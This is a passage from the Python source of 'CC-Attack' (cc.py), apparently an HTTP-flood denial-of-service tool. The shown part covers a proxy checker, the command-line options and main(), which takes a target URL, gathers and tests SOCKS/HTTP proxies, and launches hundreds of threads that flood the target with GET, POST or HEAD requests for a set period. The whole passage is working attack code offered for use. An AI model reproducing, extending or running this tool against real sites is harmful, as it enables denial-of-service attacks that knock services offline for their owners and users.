                    alive=a, rps=rps, eta=int(eta),
                ))
                sys.stdout.flush()
            except Exception:
                pass

    reporter = threading.Thread(target=_progress_reporter, daemon=True)
    reporter.start()

    try:
        with cf.ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_check_one_fast, p, proxy_type, ms): p
                       for p in proxies}
            for fut in cf.as_completed(futures):
                result = None
                try:
                    result = fut.result()
                except Exception:
                    result = None

                with lock:
                    done += 1
                    if result is not None:
                        alive.append(result)

                    now = time.time()
                    if (autosave_path is not None
                            and now - last_save >= autosave_every
                            and alive):
                        try:
                            autosave_path.write_text(
                                "\n".join(p for p, _ in alive) + "\n",
                                encoding="utf-8",
                            )
                            Log.info(t("check_autosave",
                                       n=len(alive), path=autosave_path))
                        except Exception:
                            pass
                        last_save = now
    finally:
        stop_progress.set()
        reporter.join(timeout=1)
        print()

    alive.sort(key=lambda x: x[1])
    only_proxies = [p for p, _ in alive]

    if autosave_path is not None and only_proxies:
        try:
            autosave_path.write_text(
                "\n".join(only_proxies) + "\n", encoding="utf-8"
            )
        except Exception:
            pass

    if total:
        Log.ok(t("ok_alive", n=len(only_proxies), total=total,
                 pct=len(only_proxies) / total * 100))
    else:
        Log.ok(t("ok_alive", n=0, total=0, pct=0.0))

    if alive:
        Log.info(t("ok_top", n=min(10, len(alive))))
        for rank, (proxy, latency) in enumerate(alive[:10], 1):
            print(t("ok_top_line", rank=rank, proxy=proxy, ms=latency))

    return only_proxies

# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cc.py",
        description="CC-Attack v" + VERSION + " by DIDO",
        add_help=False,
    )
    p.add_argument("-h", "-help", "--help", action="store_true", dest="help")
    p.add_argument("-url",  metavar="URL")
    p.add_argument("-m", "-mode", dest="mode",
                   choices=("cc", "post", "head"), default="cc")
    p.add_argument("-v", dest="proxy_ver", choices=("4", "5", "http"),
                   default="5")
    p.add_argument("-t", dest="threads", type=int, default=800)
    p.add_argument("-f", dest="out_file", default="proxy.txt")
    p.add_argument("-s", dest="period", type=int, default=60)
    p.add_argument("-b", dest="brute", choices=("0", "1"), default="0")
    p.add_argument("-data", dest="data")
    p.add_argument("-cookies", dest="cookies", default="")
    p.add_argument("-down", action="store_true")
    p.add_argument("-check", action="store_true")
    p.add_argument("-check-to", dest="check_to", type=int, default=3)
    p.add_argument("-check-w", dest="check_w", type=int, default=500)
    p.add_argument("-pipeline", dest="pipeline", type=int,
                   default=PIPELINE_DEPTH)
    p.add_argument("-keepalive", dest="keepalive", type=int,
                   default=KEEPALIVE_PER_SOCKET)
    p.add_argument("-log", dest="log_file")
    p.add_argument("-lang", dest="lang", choices=("ru", "en"))
    return p


def print_help() -> None:
    L = TEXTS[LANG]
    title = L["help_title"]
    print(f"""{C.BOLD}{C.YEL}CC-Attack v{VERSION}{C.RESET}  —  {title}

  {C.CYN}-url{C.RESET}      <URL>          {L['help_url']}
  {C.CYN}-m{C.RESET}        cc|post|head   {L['help_mode']}
  {C.CYN}-v{C.RESET}        4|5|http       {L['help_proxy']}
  {C.CYN}-t{C.RESET}        <N>            {L['help_threads']}
  {C.CYN}-s{C.RESET}        <sec>          {L['help_period']}
  {C.CYN}-b{C.RESET}        0|1            {L['help_brute']}
  {C.CYN}-f{C.RESET}        <file>         {L['help_file']}
  {C.CYN}-data{C.RESET}     <file>         {L['help_data']}
  {C.CYN}-cookies{C.RESET}  'a=1;b=2'      {L['help_cookies']}
  {C.CYN}-pipeline{C.RESET} <1..64>        {L['help_pipeline']}
  {C.CYN}-keepalive{C.RESET}<1..10000>     {L['help_keepalive']}
  {C.CYN}-down{C.RESET}                    {L['help_down']}
  {C.CYN}-check{C.RESET}                   {L['help_check']}
  {C.CYN}-check-to{C.RESET} <sec>          {L['help_check_to']}
  {C.CYN}-check-w{C.RESET}  <N>            {L['help_check_w']}
  {C.CYN}-log{C.RESET}      <file>         {L['help_log']}
  {C.CYN}-lang{C.RESET}     ru|en          {L['help_lang']}
  {C.CYN}-h{C.RESET}                       {L['help_help']}
""")

# ─────────────────────────────────────────────────────────────────────────────
#  main
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("-lang", dest="lang", choices=("ru", "en"))
    pre_args, _ = pre.parse_known_args()

    select_language(pre_args.lang)
    print_banner()

    args = build_parser().parse_args()

    if args.help:
        print_help()
        return 0

    if args.log_file:
        logging.basicConfig(
            filename=args.log_file, level=logging.INFO,
            format="%(asctime)s %(message)s",
        )

    if not args.url:
        Log.err(t("err_no_url"))
        return 1

    raw = args.url.strip()
    if raw.startswith("https://"):
        protocol, rest = "https", raw[8:]
    elif raw.startswith("http://"):
        protocol, rest = "http",  raw[7:]
    else:
        Log.err(t("err_url_prefix"))
        return 1

    hostport, _, tail = rest.partition("/")
    path = "/" + tail if tail else "/"
    if ":" in hostport:
        target, port_s = hostport.split(":", 1)
        port = int(port_s)
    else:
        target, port = hostport, (443 if protocol == "https" else 80)

    proxy_type = {"4": 4, "5": 5, "http": 0}[args.proxy_ver]
    out_file = Path(args.out_file)

    if args.down or not out_file.exists():
        download_proxies(args.proxy_ver, out_file)

    normalize_proxy_file(out_file)
    proxies = [l.strip() for l in out_file.read_text(
        encoding="utf-8", errors="ignore").splitlines() if l.strip()]

    if not proxies:
        Log.err(t("err_no_proxy"))
        return 1
    Log.ok(t("ok_proxy_count", n=len(proxies)))

    if args.check:
        proxies = check_proxies(
            proxies, proxy_type,
            ms=args.check_to, workers=args.check_w,
            autosave_path=out_file, autosave_every=5,
        )
        if not proxies:
            Log.err(t("err_no_alive"))
            return 1
        out_file.write_text("\n".join(proxies) + "\n", encoding="utf-8")

    post_data = ""
    if args.data:
        try:
            post_data = Path(args.data).read_text(
                encoding="utf-8", errors="ignore").replace("\n", " ")
        except OSError as e:
            Log.err(t("err_data_read", e=e))
            return 1

    Log.info(t("info_target", url=f"{protocol}://{target}:{port}{path}"))
    Log.info(t("info_mode", mode=args.mode, threads=args.threads,
               v=args.proxy_ver, p=args.pipeline))

    stop_event = threading.Event()

    def _shutdown(signum, frame):
        if stop_event.is_set():
            Log.warn(t("warn_force"))
            os._exit(1)
        Log.warn(t("warn_shutdown"))
        stop_event.set()

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    pool_size = max(500, min(20000, 200 * args.threads))

    handler = CCHandler(
        target=target, path=path, port=port, protocol=protocol,
        proxies=proxies, proxy_type=proxy_type, cookies=args.cookies,
        post_data=post_data, brute=(args.brute == "1"),
        stop_event=stop_event,
        pipeline_depth=args.pipeline,
        keepalive_per_socket=args.keepalive,
        header_pool_size=pool_size,
    )

    Log.info(t("info_start"))
    threads = []
    for _ in range(args.threads):
        th = threading.Thread(target=handler.run, args=(args.mode,), daemon=True)
        th.start()
        threads.append(th)

    start = time.time()
    try:
        while time.time() - start < args.period and not stop_event.is_set():
            time.sleep(1)
            elapsed = max(1e-6, time.time() - start)
            sent = handler.stats["sent"]
            sys.stdout.write("\r" + t(
                "progress",
                grn=C.GRN, rst=C.RESET, cyn=C.CYN, red=C.RED, yel=C.YEL,
                prp=C.PRP,
                el=int(elapsed), tot=args.period,
                sent=sent,
                err=handler.stats["errors"],
                mb=handler.stats["bytes"] / 1048576,
                rps=sent / elapsed,
            ))
            sys.stdout.flush()
    finally:
        stop_event.set()
        print()
        total_time = max(1e-6, time.time() - start)
        Log.ok(t("ok_done",
                 sent=handler.stats["sent"],
                 err=handler.stats["errors"],
                 mb=handler.stats["bytes"] / 1048576,
                 rps=handler.stats["sent"] / total_time))

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        Log.warn(t("warn_interrupt"))
        sys.exit(130)